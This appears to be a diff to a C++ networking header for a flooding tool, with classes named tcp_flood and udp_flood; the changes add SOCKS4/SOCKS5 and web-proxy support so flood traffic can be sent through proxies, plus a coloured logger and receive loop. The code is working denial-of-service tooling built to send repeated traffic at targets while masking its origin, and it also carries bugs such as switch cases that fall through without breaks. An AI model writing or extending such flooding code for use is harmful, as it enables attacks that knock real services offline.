@@ -10,9 +10,11 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <unistd.h>
-#include <iostream>
 #include <memory>
 #include <netdb.h>
+
+#include "proxysocks.hpp"
+#include "color.hpp"
 
 #define MAX_QUERIES 2048
 #define PROXY_CONNECT "CONNECT"
@@ -24,18 +26,43 @@ namespace net
 	
 	namespace __detail__ __attribute__((visibility("hidden")))
 	{
-		static consteval size_t consteval_strlen(const char* str)
+		inline static consteval size_t consteval_strlen(const char* str)
 		{
 			size_t size = 0;
 			for (; *str; ++str);
 			return size;
 		}
 		
-		static constexpr size_t constexpr_strlen(const char* str)
+		inline static constexpr size_t constexpr_strlen(const char* str)
 		{
 			size_t size = 0;
-			for (; *str; ++str);
+			for (; *str; ++str, ++size);
 			return size;
+		}
+		
+		inline static void logger_fn(int level, const char* message, void* userdata)
+		{
+			FILE* stream;
+			std::string logging_prefix;
+			switch (level)
+			{
+				case PROXYSOCKET_LOG_DEBUG:
+					stream = stdout;
+					logging_prefix = COLOR_CYAN COLOR_INTENSE "[DEBUG]" COLOR_RESET COLOR_CYAN;
+				case PROXYSOCKET_LOG_ERROR:
+					stream = stderr;
+					logging_prefix = COLOR_RED COLOR_INTENSE "[ERROR]" COLOR_RESET COLOR_RED;
+				case PROXYSOCKET_LOG_INFO:
+					stream = stdout;
+					logging_prefix = COLOR_BLUE COLOR_INTENSE "[INFO]" COLOR_RESET COLOR_BLUE;
+				case PROXYSOCKET_LOG_WARNING:
+					stream = stdout;
+					logging_prefix = COLOR_YELLOW COLOR_INTENSE "[WARNING]" COLOR_RESET COLOR_YELLOW;
+				default:
+					stream = stdout;
+					logging_prefix = COLOR_WHITE COLOR_FAINT "[UNDEFINED]" COLOR_RESET COLOR_WHITE;
+			}
+			::fprintf(stream, COLOR_RESET "%s %s" COLOR_RESET "\n", logging_prefix.c_str(), message);
 		}
 	}
 	
@@ -46,7 +73,7 @@ namespace net
 		inline inet_address(in_addr_t __address, in_port_t __port) : address{AF_INET, ::htons(__port), in_addr{__address}}
 		{ }
 		
-		inline inet_address(std::string __address) : address{AF_INET}
+		inline inet_address(std::string __address, bool resolve = true) : address{AF_INET}
 		{
 			in_port_t port = 80;
 			if (__address.starts_with("ftp://"))
@@ -104,6 +131,16 @@ namespace net
 				port = 443;
 				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("https://"));
 			}
+			else if (__address.starts_with("socks5://") || __address.starts_with("socks4://"))
+			{
+				port = 1080;
+				__address.erase(__address.begin(), __address.begin() + __detail__::constexpr_strlen("socks5://"));
+			}
+			else if (__address.starts_with("web://"))
+			{
+				port = 3128;
+				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("web://"));
+			}
 			else if (__address.starts_with("rdp://"))
 			{
 				port = 3389;
@@ -116,10 +153,10 @@ namespace net
 				++colonpos;
 				port = std::stoul(__address.substr(colonpos));
 			}
-			
+			hostname = __address.substr(0, colonpos - 1);
 			address.sin_port = ::htons(port);
-			::inet_aton(__address.substr(0, colonpos - 1).c_str(), &address.sin_addr);
-			if (address.sin_addr.s_addr == 0)
+			::inet_aton(hostname.c_str(), &address.sin_addr);
+			if (address.sin_addr.s_addr == 0 && resolve)
 			{
 				auto addr_list = *reinterpret_cast<in_addr**>(::gethostbyname(__address.substr(0, colonpos - 1).c_str())->h_addr_list);
 				address.sin_addr = addr_list[0];
@@ -142,53 +179,51 @@ namespace net
 		friend class udp_flood;
 		
 		sockaddr_in address;
+		std::string hostname;
 	};
 	
 	class tcp_flood
 	{
 	public:
-		inline tcp_flood(const inet_address& address, const std::string& data, const inet_address* proxy, bool debug = false)
-				: address(address), socket(::socket(AF_INET, SOCK_STREAM, IPPROTO_IP))
+		inline tcp_flood(
+				const inet_address& address, const std::string& data,
+				const inet_address* proxy, int proxytype = PROXYSOCKET_TYPE_NONE, const char* proxy_user = "", const char* proxy_password = "",
+				bool debug = false)
+				: address(address)
 		{
 			if (proxy)
 			{
-				if (::connect(socket, reinterpret_cast<const sockaddr*>(&proxy->address), sizeof proxy->address) < 0)
-					status = false;
-				
-				std::string req_buf(PROXY_CONNECT " ");
-				req_buf += address.get_ip();
-				req_buf += ':';
-				req_buf += std::to_string(address.get_port());
-				req_buf += data;
-				
-				if (::send(socket, req_buf.c_str(), req_buf.size(), 0) < 0)
+				auto proxysock_cfg = proxysocketconfig_create_direct();
+				if (debug)
+					proxysocketconfig_set_logging(proxysock_cfg, __detail__::logger_fn, (int*)&debug);
+				proxysocketconfig_use_proxy_dns(proxysock_cfg, 1);
+				proxysocketconfig_add_proxy(proxysock_cfg, proxytype, proxy->get_ip().c_str(), proxy->get_port(), proxy_user, proxy_password);
+				char* errmsg;
+				if ((socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
 					status = false;
 			}
 			else
 			{
 				if (::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
 					status = false;
-				
-				if (::send(socket, data.c_str(), data.size(), 0) < 0)
-					status = false;
 			}
 			
-			::sleep(1);
-
-//			std::array<char, 128> tmp{ };
-//			size_t recved;
-//			if (debug)
-//				std::cout << "data = R\"(";
-//			for (size_t i = 0; ((recved = ::recv(socket, tmp.data(), 128, MSG_DONTWAIT) >= 0) ||
-//								errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
-//			{
-//				::usleep(1000);
-//				if (debug)
-//					std::cout.write(tmp.data(), std::min(recved, tmp.size()));
-//			}
-//			if (debug)
-//				std::cout << ")\"\n";
-//			std::cout.flush();
+			if (::send(socket, data.c_str(), data.size(), 0) < 0)
+				status = false;
+			
+			char tmp;
+			size_t recved;
+			if (debug)
+				printf("data = R\"(");
+			for (size_t i = 0; ((recved = ::recv(socket, &tmp, sizeof tmp, MSG_DONTWAIT) >= 0) ||
+								errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
+			{
+				::usleep(1000);
+				if (debug)
+					if (recved > 0) printf("\\%x", tmp);
+			}
+			if (debug)
+				printf(")\"\n");
 		}
 		
 		inline operator bool()
